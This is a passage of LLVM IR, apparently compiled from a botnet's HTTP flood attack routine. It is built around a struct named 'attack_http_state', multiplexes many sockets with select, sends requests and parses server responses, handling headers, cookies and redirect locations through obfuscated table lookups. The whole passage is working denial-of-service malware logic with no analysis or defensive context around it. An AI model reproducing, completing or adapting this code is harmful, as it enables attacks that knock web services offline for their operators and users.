  %326 = call i32 @util_strlen(i8* nonnull %67) #7
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %327
  br i1 %325, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %303
  %.lcssa = phi i8* [ %312, %303 ], [ %328, %._crit_edge.loopexit ]
  %329 = call i32 @util_strcpy(i8* %.lcssa, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br label %330

; <label>:330:                                    ; preds = %._crit_edge, %299
  %331 = call i32 @util_strlen(i8* nonnull %67) #7
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %332
  %334 = call i32 @util_strcpy(i8* %333, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br i1 %68, label %335, label %340

; <label>:335:                                    ; preds = %330
  %336 = call i32 @util_strlen(i8* nonnull %67) #7
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %337
  %339 = call i32 @util_strcpy(i8* %338, i8* nonnull %14) #7
  br label %340

; <label>:340:                                    ; preds = %335, %330
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 10, i64 0
  %342 = call signext i8 @util_strcmp(i8* nonnull %211, i8* %341) #7
  %343 = icmp eq i8 %342, 0
  br i1 %343, label %344, label %346

; <label>:344:                                    ; preds = %340
  %345 = call i32 @util_strcpy(i8* nonnull %211, i8* %341) #7
  br label %346

; <label>:346:                                    ; preds = %340, %344
  %347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %348 = load i32, i32* %347, align 4
  %349 = call i32 @util_strlen(i8* nonnull %67) #7
  %350 = sext i32 %349 to i64
  %351 = call i64 @send(i32 %348, i8* nonnull %67, i64 %350, i32 16384) #7
  %352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 3
  store i32 %134, i32* %352, align 4
  store i8 6, i8* %138, align 4
  %353 = load i32, i32* %347, align 4
  %354 = srem i32 %353, 64
  %355 = zext i32 %354 to i64
  %356 = shl i64 1, %355
  %357 = sdiv i32 %353, 64
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %358
  %360 = load i64, i64* %359, align 8
  %361 = or i64 %356, %360
  store i64 %361, i64* %359, align 8
  %362 = load i32, i32* %347, align 4
  %363 = icmp sgt i32 %362, %.0530612
  %364 = add nsw i32 %362, 1
  %..0530551 = select i1 %363, i32 %364, i32 %.0530612
  br label %411

; <label>:365:                                    ; preds = %145
  %366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %367 = load i32, i32* %366, align 4
  %368 = srem i32 %367, 64
  %369 = zext i32 %368 to i64
  %370 = shl i64 1, %369
  %371 = sdiv i32 %367, 64
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %372
  %374 = load i64, i64* %373, align 8
  %375 = or i64 %370, %374
  store i64 %375, i64* %373, align 8
  %376 = load i32, i32* %366, align 4
  %377 = icmp sgt i32 %376, %.0530612
  %378 = add nsw i32 %376, 1
  %..0530552 = select i1 %377, i32 %378, i32 %.0530612
  br label %411

; <label>:379:                                    ; preds = %145
  %380 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %381 = load i32, i32* %380, align 4
  %382 = srem i32 %381, 64
  %383 = zext i32 %382 to i64
  %384 = shl i64 1, %383
  %385 = sdiv i32 %381, 64
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %386
  %388 = load i64, i64* %387, align 8
  %389 = or i64 %384, %388
  store i64 %389, i64* %387, align 8
  %390 = load i32, i32* %380, align 4
  %391 = icmp sgt i32 %390, %.0530612
  %392 = add nsw i32 %390, 1
  %..0530553 = select i1 %391, i32 %392, i32 %.0530612
  br label %411

; <label>:393:                                    ; preds = %145
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %395 = load i32, i32* %394, align 4
  %396 = srem i32 %395, 64
  %397 = zext i32 %396 to i64
  %398 = shl i64 1, %397
  %399 = sdiv i32 %395, 64
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %400
  %402 = load i64, i64* %401, align 8
  %403 = or i64 %398, %402
  store i64 %403, i64* %401, align 8
  %404 = load i32, i32* %394, align 4
  %405 = icmp sgt i32 %404, %.0530612
  %406 = add nsw i32 %404, 1
  %..0530554 = select i1 %405, i32 %406, i32 %.0530612
  br label %411

; <label>:407:                                    ; preds = %145
  store i8 0, i8* %138, align 4
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %409 = load i32, i32* %408, align 4
  %410 = call i32 @close(i32 %409) #7
  store i32 -1, i32* %408, align 4
  br label %411

; <label>:411:                                    ; preds = %393, %379, %365, %346, %189, %156, %407, %153, %185
  %.1531 = phi i32 [ %.0530612, %153 ], [ %.0530612, %185 ], [ %.0530612, %407 ], [ %..0530, %156 ], [ %..0530550, %189 ], [ %..0530551, %346 ], [ %..0530552, %365 ], [ %..0530553, %379 ], [ %..0530554, %393 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %412 = icmp slt i64 %indvars.iv.next, %69
  br i1 %412, label %.lr.ph615, label %._crit_edge616

._crit_edge616:                                   ; preds = %411
  %413 = icmp eq i32 %.1531, 0
  br i1 %413, label %.backedge596.backedge, label %414

.backedge596.backedge:                            ; preds = %._crit_edge616, %414, %.backedge596, %.backedge596.loopexit
  br label %.backedge596

; <label>:414:                                    ; preds = %._crit_edge616
  store i64 0, i64* %57, align 8
  store i64 1, i64* %58, align 8
  %415 = call i32 @select(i32 %.1531, %struct.fd_set* nonnull %7, %struct.fd_set* nonnull %8, %struct.fd_set* null, %struct.timeval* nonnull %9) #7
  %416 = call i64 @time(i64* null) #7
  %417 = trunc i64 %416 to i32
  %418 = icmp slt i32 %415, 1
  %brmerge = or i1 %418, %.not
  br i1 %brmerge, label %.backedge596.backedge, label %.lr.ph633.preheader

.lr.ph633.preheader:                              ; preds = %414
  br label %.lr.ph633

.lr.ph633:                                        ; preds = %.lr.ph633.preheader, %.loopexit591
  %indvars.iv659 = phi i64 [ %indvars.iv.next660, %.loopexit591 ], [ 0, %.lr.ph633.preheader ]
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 0
  %420 = load i32, i32* %419, align 4
  %421 = icmp eq i32 %420, -1
  br i1 %421, label %.loopexit591, label %422

; <label>:422:                                    ; preds = %.lr.ph633
  %423 = sdiv i32 %420, 64
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %424
  %426 = load i64, i64* %425, align 8
  %427 = srem i32 %420, 64
  %428 = zext i32 %427 to i64
  %429 = shl i64 1, %428
  %430 = and i64 %426, %429
  %431 = icmp eq i64 %430, 0
  br i1 %431, label %444, label %432

; <label>:432:                                    ; preds = %422
  store i32 0, i32* %12, align 4
  store i32 4, i32* %13, align 4
  %433 = load i32, i32* %419, align 4
  %434 = call i32 @getsockopt(i32 %433, i32 1, i32 4, i8* nonnull %60, i32* nonnull %13) #7
  %435 = load i32, i32* %12, align 4
  %436 = or i32 %435, %434
  %437 = icmp eq i32 %436, 0
  br i1 %437, label %438, label %440

; <label>:438:                                    ; preds = %432
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 4, i8* %439, align 4
  br label %444

; <label>:440:                                    ; preds = %432
  %441 = load i32, i32* %419, align 4
  %442 = call i32 @close(i32 %441) #7
  store i32 -1, i32* %419, align 4
  %443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  store i8 0, i8* %443, align 4
  br label %.loopexit591

; <label>:444:                                    ; preds = %422, %438
  %445 = load i32, i32* %419, align 4
  %446 = sdiv i32 %445, 64
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %447
  %449 = load i64, i64* %448, align 8
  %450 = srem i32 %445, 64
  %451 = zext i32 %450 to i64
  %452 = shl i64 1, %451
  %453 = and i64 %452, %449
  %454 = icmp eq i64 %453, 0
  br i1 %454, label %.loopexit591, label %455

; <label>:455:                                    ; preds = %444
  %456 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 1
  %457 = load i8, i8* %456, align 4
  switch i8 %457, label %.loopexit591 [
    i8 6, label %467
    i8 7, label %.preheader590
    i8 10, label %.preheader592.preheader
  ]

.preheader592.preheader:                          ; preds = %455
  br label %.preheader592

.preheader590:                                    ; preds = %455
  %458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 17
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 64
  %461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 0
  %462 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 2
  %463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  %464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  %465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  %466 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  br label %931

; <label>:467:                                    ; preds = %455
  call void @util_zero(i8* nonnull %21, i32 10240) #7
  %468 = load i32, i32* %419, align 4
  %469 = call i64 @recv(i32 %468, i8* nonnull %21, i64 10240, i32 16386) #7
  %470 = trunc i64 %469 to i32
  %471 = icmp slt i32 %470, 1
  br i1 %471, label %472, label %475

; <label>:472:                                    ; preds = %467
  %473 = load i32, i32* %419, align 4
  %474 = call i32 @close(i32 %473) #7
  store i32 -1, i32* %419, align 4
  store i8 0, i8* %456, align 4
  br label %.loopexit591

; <label>:475:                                    ; preds = %467
  %476 = call i32 @util_memsearch(i8* nonnull %21, i32 %470, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %477 = icmp eq i32 %476, -1
  %478 = icmp slt i32 %470, 10240
  %or.cond5 = and i1 %478, %477
  br i1 %or.cond5, label %.loopexit591, label %479

; <label>:479:                                    ; preds = %475
  %480 = call i32 @util_memsearch(i8* nonnull %21, i32 %470, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %481
  store i8 0, i8* %482, align 1
  %483 = call i8* @table_retrieve_val(i32 62, i32* null) #7
  %484 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %483) #7
  %485 = icmp eq i32 %484, -1
  br i1 %485, label %488, label %486

; <label>:486:                                    ; preds = %479
  %487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 2, i32* %487, align 4
  br label %488

; <label>:488:                                    ; preds = %479, %486
  %489 = call i8* @table_retrieve_val(i32 61, i32* null) #7
  %490 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %489) #7
  %491 = icmp eq i32 %490, -1
  br i1 %491, label %494, label %492

; <label>:492:                                    ; preds = %488
  %493 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 11
  store i32 1, i32* %493, align 4
  br label %494

; <label>:494:                                    ; preds = %488, %492
  %495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 12
  store i32 0, i32* %495, align 4
  %496 = call i8* @table_retrieve_val(i32 60, i32* null) #7
  %497 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %496) #7
  %498 = icmp eq i32 %497, -1
  br i1 %498, label %523, label %499

; <label>:499:                                    ; preds = %494
  %500 = call i8* @table_retrieve_val(i32 60, i32* null) #7
  %501 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %500) #7
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %502
  %504 = load i8, i8* %503, align 1
  %505 = icmp eq i8 %504, 32
  %506 = zext i1 %505 to i32
  %.555 = add nsw i32 %506, %501
  %507 = sext i32 %.555 to i64
  %508 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %507
  %509 = sub nsw i32 %470, %.555
  %510 = call i32 @util_memsearch(i8* %508, i32 %509, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %511 = icmp eq i32 %510, -1
  br i1 %511, label %523, label %512

; <label>:512:                                    ; preds = %499
  %513 = icmp sgt i32 %510, 1
  %514 = add nsw i32 %510, -2
  %.556 = select i1 %513, i32 %514, i32 %510
  %515 = add nsw i32 %.555, %.556
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %516
  store i8 0, i8* %517, align 1
  %518 = call i32 @util_strlen(i8* %508) #7
  %519 = call i8* @table_retrieve_val(i32 59, i32* null) #7
  %520 = call i32 @util_stristr(i8* %508, i32 %518, i8* %519) #7
  %521 = icmp eq i32 %520, 0
  br i1 %521, label %523, label %522

; <label>:522:                                    ; preds = %512
  store i32 1, i32* %495, align 4
  br label %523

; <label>:523:                                    ; preds = %512, %499, %494, %522
  %524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  store i32 0, i32* %524, align 4
  %525 = call i8* @table_retrieve_val(i32 57, i32* null) #7
  %526 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %525) #7
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %552, label %528

; <label>:528:                                    ; preds = %523
  %529 = call i8* @table_retrieve_val(i32 57, i32* null) #7
  %530 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %529) #7
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %531
  %533 = load i8, i8* %532, align 1
  %534 = icmp eq i8 %533, 32
  %535 = zext i1 %534 to i32
  %.557 = add nsw i32 %535, %530
  %536 = sext i32 %.557 to i64
  %537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %536
  %538 = sub nsw i32 %470, %.557
  %539 = call i32 @util_memsearch(i8* %537, i32 %538, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %540 = icmp eq i32 %539, -1
  br i1 %540, label %552, label %541

; <label>:541:                                    ; preds = %528
  %542 = icmp sgt i32 %539, 1
  %543 = add nsw i32 %539, -2
  %.558 = select i1 %542, i32 %543, i32 %539
  %544 = add nsw i32 %.557, %.558
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %545
  store i8 0, i8* %546, align 1
  %547 = call i32 @util_strlen(i8* %537) #7
  %548 = call i8* @table_retrieve_val(i32 58, i32* null) #7
  %549 = call i32 @util_stristr(i8* %537, i32 %547, i8* %548) #7
  %550 = icmp eq i32 %549, 0
  br i1 %550, label %552, label %551

; <label>:551:                                    ; preds = %541
  store i32 1, i32* %524, align 4
  br label %552

; <label>:552:                                    ; preds = %541, %528, %523, %551
  %553 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %554 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %553) #7
  %555 = icmp eq i32 %554, -1
  br i1 %555, label %.sink.split, label %556

; <label>:556:                                    ; preds = %552
  %557 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %558 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %557) #7
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %559
  %561 = load i8, i8* %560, align 1
  %562 = icmp eq i8 %561, 32
  %563 = zext i1 %562 to i32
  %.559 = add nsw i32 %563, %558
  %564 = sext i32 %.559 to i64
  %565 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %564
  %566 = sub nsw i32 %470, %.559
  %567 = call i32 @util_memsearch(i8* %565, i32 %566, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %568 = icmp eq i32 %567, -1
  br i1 %568, label %.preheader589, label %569

; <label>:569:                                    ; preds = %556
  %570 = icmp sgt i32 %567, 1
  %571 = add nsw i32 %567, -2
  %.560 = select i1 %570, i32 %571, i32 %567
  %572 = add nsw i32 %.559, %.560
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %573
  store i8 0, i8* %574, align 1
  %575 = call i32 @util_atoi(i8* %565, i32 10) #7
  br label %.sink.split

.sink.split:                                      ; preds = %552, %569
  %.sink6 = phi i32 [ %575, %569 ], [ 0, %552 ]
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  store i32 %.sink6, i32* %576, align 4
  br label %.preheader589

.preheader589:                                    ; preds = %556, %.sink.split
  %577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  %578 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %579 = call i32 @util_stristr(i8* nonnull %59, i32 %470, i8* %578) #7
  %580 = icmp eq i32 %579, -1
  br i1 %580, label %.critedge561, label %.lr.ph625.preheader

.lr.ph625.preheader:                              ; preds = %.preheader589
  br label %.lr.ph625

.lr.ph625:                                        ; preds = %.lr.ph625.preheader, %.loopexit
  %581 = phi i8* [ %652, %.loopexit ], [ %59, %.lr.ph625.preheader ]
  %.0539624 = phi i32 [ %650, %.loopexit ], [ 0, %.lr.ph625.preheader ]
  %582 = load i32, i32* %577, align 4
  %583 = icmp slt i32 %582, 5
  br i1 %583, label %584, label %.critedge561.loopexit

; <label>:584:                                    ; preds = %.lr.ph625
  %585 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %586 = call i32 @util_stristr(i8* %581, i32 %470, i8* %585) #7
  %587 = add nsw i32 %586, %.0539624
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %588
  %590 = load i8, i8* %589, align 1
  %591 = icmp eq i8 %590, 32
  %592 = zext i1 %591 to i32
  %.562 = add nsw i32 %592, %586
  %593 = sext i32 %.562 to i64
  %594 = getelementptr inbounds i8, i8* %581, i64 %593
  %595 = sub nsw i32 %470, %.0539624
  %596 = sub i32 %595, %.562
  %597 = call i32 @util_memsearch(i8* %594, i32 %596, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %598 = icmp eq i32 %597, -1
  br i1 %598, label %.loopexit, label %599

; <label>:599:                                    ; preds = %584
  %600 = add nsw i32 %.562, %.0539624
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %601
  %603 = icmp sgt i32 %597, 1
  %604 = add nsw i32 %597, -2
  %.563 = select i1 %603, i32 %604, i32 %597
  %605 = call i32 @util_memsearch(i8* %594, i32 %596, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1) #7
  %606 = icmp sgt i32 %605, 0
  br i1 %606, label %607, label %610

; <label>:607:                                    ; preds = %599
  %608 = call i32 @util_memsearch(i8* %594, i32 %596, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1) #7
  %609 = add nsw i32 %608, -1
  br label %610

; <label>:610:                                    ; preds = %607, %599
  %.1533 = phi i32 [ %609, %607 ], [ %.563, %599 ]
  %611 = add nsw i32 %.1533, %600
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %612
  store i8 0, i8* %613, align 1
  store i32 0, i32* %5, align 4
  %614 = call i32 @util_strlen(i8* nonnull %602) #7
  %615 = icmp sgt i32 %614, 0
  br i1 %615, label %.lr.ph619.preheader, label %._crit_edge620

.lr.ph619.preheader:                              ; preds = %610
  br label %.lr.ph619

; <label>:616:                                    ; preds = %.lr.ph619
  store i32 %624, i32* %5, align 4
  %617 = call i32 @util_strlen(i8* nonnull %602) #7
  %618 = icmp slt i32 %624, %617
  br i1 %618, label %.lr.ph619, label %._crit_edge620.loopexit

.lr.ph619:                                        ; preds = %.lr.ph619.preheader, %616
  %619 = load i32, i32* %5, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds i8, i8* %602, i64 %620
  %622 = load i8, i8* %621, align 1
  %623 = icmp eq i8 %622, 61
  %624 = add nsw i32 %619, 1
  br i1 %623, label %._crit_edge620.loopexit, label %616

._crit_edge620.loopexit:                          ; preds = %.lr.ph619, %616
  br label %._crit_edge620

._crit_edge620:                                   ; preds = %._crit_edge620.loopexit, %610
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds i8, i8* %602, i64 %626
  %628 = load i8, i8* %627, align 1
  %629 = icmp eq i8 %628, 61
  br i1 %629, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge620
  store i32 0, i32* %5, align 4
  %630 = load i32, i32* %577, align 4
  %631 = icmp sgt i32 %630, 0
  br i1 %631, label %.lr.ph623.preheader, label %.critedge564

.lr.ph623.preheader:                              ; preds = %.preheader
  br label %.lr.ph623

.lr.ph623:                                        ; preds = %.lr.ph623.preheader, %636
  %storemerge547622 = phi i32 [ %638, %636 ], [ 0, %.lr.ph623.preheader ]
  %632 = sext i32 %storemerge547622 to i64
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %632, i64 0
  %634 = call signext i8 @util_strncmp(i8* %602, i8* %633, i32 %625) #7
  %635 = icmp eq i8 %634, 0
  br i1 %635, label %636, label %.loopexit.loopexit

; <label>:636:                                    ; preds = %.lr.ph623
  %637 = load i32, i32* %5, align 4
  %638 = add nsw i32 %637, 1
  store i32 %638, i32* %5, align 4
  %639 = load i32, i32* %577, align 4
  %640 = icmp slt i32 %638, %639
  br i1 %640, label %.lr.ph623, label %.critedge564.loopexit

.critedge564.loopexit:                            ; preds = %636
  br label %.critedge564

.critedge564:                                     ; preds = %.critedge564.loopexit, %.preheader
  %641 = call i32 @util_strlen(i8* %602) #7
  %642 = icmp slt i32 %641, 128
  br i1 %642, label %643, label %.loopexit

; <label>:643:                                    ; preds = %.critedge564
  %644 = load i32, i32* %577, align 4
  %645 = sext i32 %644 to i64
  %646 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %645, i64 0
  %647 = call i32 @util_strcpy(i8* %646, i8* %602) #7
  %648 = load i32, i32* %577, align 4
  %649 = add nsw i32 %648, 1
  store i32 %649, i32* %577, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph623
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %584, %._crit_edge620, %.critedge564, %643
  %650 = add nsw i32 %.562, %.0539624
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %651
  %653 = call i8* @table_retrieve_val(i32 55, i32* null) #7
  %654 = call i32 @util_stristr(i8* %652, i32 %470, i8* %653) #7
  %655 = icmp eq i32 %654, -1
  br i1 %655, label %.critedge561.loopexit, label %.lr.ph625

.critedge561.loopexit:                            ; preds = %.loopexit, %.lr.ph625
  br label %.critedge561

.critedge561:                                     ; preds = %.critedge561.loopexit, %.preheader589
  %656 = call i8* @table_retrieve_val(i32 54, i32* null) #7
  %657 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %656) #7
  %658 = icmp eq i32 %657, -1
  br i1 %658, label %751, label %659

; <label>:659:                                    ; preds = %.critedge561
  %660 = call i8* @table_retrieve_val(i32 54, i32* null) #7
  %661 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %660) #7
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %662
  %664 = load i8, i8* %663, align 1
  %665 = icmp eq i8 %664, 32
  %666 = zext i1 %665 to i32
  %.565 = add nsw i32 %666, %661
  %667 = sext i32 %.565 to i64
  %668 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %667
  %669 = sub nsw i32 %470, %.565
  %670 = call i32 @util_memsearch(i8* %668, i32 %669, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %671 = icmp eq i32 %670, -1
  br i1 %671, label %751, label %672

; <label>:672:                                    ; preds = %659
  %673 = icmp sgt i32 %670, 1
  %674 = add nsw i32 %670, -2
  %.566 = select i1 %673, i32 %674, i32 %670
  %675 = add nsw i32 %.565, %.566
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %676
  store i8 0, i8* %677, align 1
  %678 = add nsw i32 %.566, 1
  %679 = call i32 @util_memsearch(i8* %668, i32 %678, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4) #7
  %680 = icmp eq i32 %679, 4
  br i1 %680, label %681, label %726

; <label>:681:                                    ; preds = %672
  %682 = getelementptr inbounds i8, i8* %668, i64 4
  %683 = load i8, i8* %682, align 1
  %684 = icmp eq i8 %683, 115
  %.567 = select i1 %684, i32 8, i32 7
  store i32 %.567, i32* %5, align 4
  %685 = zext i32 %.567 to i64
  %686 = getelementptr inbounds i8, i8* %668, i64 %685
  %687 = sub nsw i32 %678, %.567
  %688 = sext i32 %687 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %668, i8* %686, i64 %688, i32 1, i1 false)
  br label %689

; <label>:689:                                    ; preds = %694, %681
  %indvars.iv653 = phi i64 [ %indvars.iv.next654, %694 ], [ 0, %681 ]
  %690 = getelementptr inbounds i8, i8* %668, i64 %indvars.iv653
  %691 = load i8, i8* %690, align 1
  switch i8 %691, label %694 [
    i8 0, label %.loopexit588
    i8 47, label %692
  ]

; <label>:692:                                    ; preds = %689
  %693 = trunc i64 %indvars.iv653 to i32
  store i32 %693, i32* %5, align 4
  store i8 0, i8* %690, align 1
  br label %696

; <label>:694:                                    ; preds = %689
  %indvars.iv.next654 = add nuw i64 %indvars.iv653, 1
  br label %689

.loopexit588:                                     ; preds = %689
  %695 = trunc i64 %indvars.iv653 to i32
  store i32 %695, i32* %5, align 4
  br label %696

; <label>:696:                                    ; preds = %.loopexit588, %692
  %697 = call i32 @util_strlen(i8* nonnull %668) #7
  %698 = icmp sgt i32 %697, 0
  br i1 %698, label %699, label %705

; <label>:699:                                    ; preds = %696
  %700 = call i32 @util_strlen(i8* nonnull %668) #7
  %701 = icmp slt i32 %700, 128
  br i1 %701, label %702, label %705

; <label>:702:                                    ; preds = %699
  %703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %704 = call i32 @util_strcpy(i8* %703, i8* nonnull %668) #7
  br label %705

; <label>:705:                                    ; preds = %702, %699, %696
  %706 = load i32, i32* %5, align 4
  %707 = add nsw i32 %706, 1
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds i8, i8* %668, i64 %708
  %710 = call i32 @util_strlen(i8* %709) #7
  %711 = icmp slt i32 %710, 256
  br i1 %711, label %712, label %750

; <label>:712:                                    ; preds = %705
  %713 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %713, i32 255) #7
  %714 = load i32, i32* %5, align 4
  %715 = add nsw i32 %714, 1
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds i8, i8* %668, i64 %716
  %718 = call i32 @util_strlen(i8* %717) #7
  %719 = icmp sgt i32 %718, 0
  br i1 %719, label %720, label %750

; <label>:720:                                    ; preds = %712
  %721 = load i32, i32* %5, align 4
  %722 = add nsw i32 %721, 1
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds i8, i8* %668, i64 %723
  %725 = call i32 @util_strcpy(i8* %713, i8* %724) #7
  br label %750

; <label>:726:                                    ; preds = %672
  %727 = load i8, i8* %668, align 1
  %728 = icmp eq i8 %727, 47
  br i1 %728, label %729, label %750

; <label>:729:                                    ; preds = %726
